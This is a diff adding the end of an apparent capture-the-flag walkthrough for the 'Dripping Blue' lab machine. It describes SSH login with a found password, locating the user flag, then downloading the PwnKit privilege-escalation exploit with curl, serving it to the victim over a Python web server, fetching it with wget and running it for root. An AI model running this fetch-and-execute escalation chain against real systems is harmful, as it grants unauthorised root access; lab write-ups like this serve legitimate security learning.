@@ -134,4 +134,45 @@ WE VALIDATE AND READY WE ARE INSIDE, NOW TO LOOK FOR THE FLAG
 ![image](https://github.com/moistealth/Dripping_Blue/assets/108200081/224fd67b-610a-4d25-a5f7-c29c2167cd9e)
 
 
+We make an ssh connection for the user *thugger* with the password we obtained *imdrippinbatch*
 
+![image](https://github.com/Stealthy-lab/Dripping_Blue/assets/108200081/336d302d-c949-4d27-879b-345618367bc5)
+
+
+We do an ls to see what we find, and there we can identify the *user.txt* that is our flag.
+![image](https://github.com/Stealthy-lab/Dripping_Blue/assets/108200081/18f7db37-7fef-4f9b-bce8-78aadbeb3394)
+![image](https://github.com/Stealthy-lab/Dripping_Blue/assets/108200081/591a9fa3-dd3b-417a-a147-20494a4419bd)
+
+
+Now we proceed to download the file *PwnKit* to our local machine in the directory *(/tmp)* with the following command *curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit*
+
+**PwnKit is a privilege escalation vulnerability that allows local users to gain full root privileges on any vulnerable linux distribution**
+
+![image](https://github.com/Stealthy-lab/Dripping_Blue/assets/108200081/e92d6e32-ade4-4124-a58b-49c58e6ddfc4)
+
+
+The next thing will be to open a server with python to later download this file from the victim machine and thus be able to execute it.
+
+**we execute the following command** *python3 -m http.server*
+
+![image](https://github.com/Stealthy-lab/Dripping_Blue/assets/108200081/686d04ec-ea61-43e9-87b3-9f8784b637b3)
+*there we have our server up on port 8000*
+
+
+
+Now from the victim machine we access the */tmp* directory and with the following command we download *PwnKit* from our server: *wget http://IP:8000/PwnKit*
+
+![image](https://github.com/Stealthy-lab/Dripping_Blue/assets/108200081/134c889a-2e57-47d3-b6f2-6e94088a7881)
+
+
+We grant all the permissions with the command *chmod +x PwnKit* and later we do a *ls -la* to verify the added permissions.
+
+![image](https://github.com/Stealthy-lab/Dripping_Blue/assets/108200081/d056d38e-146b-4574-a45b-92867a2cc123)
+
+
+As a final part, it would only be to execute the command *./PwnKit* and that's it we have access to root and the flag.
+
+![image](https://github.com/Stealthy-lab/Dripping_Blue/assets/108200081/3d3b4ab7-c3ae-43c6-b162-914c5eff7624)
+
+
+**I hope this contribution has been very helpful, I count on your comments.**
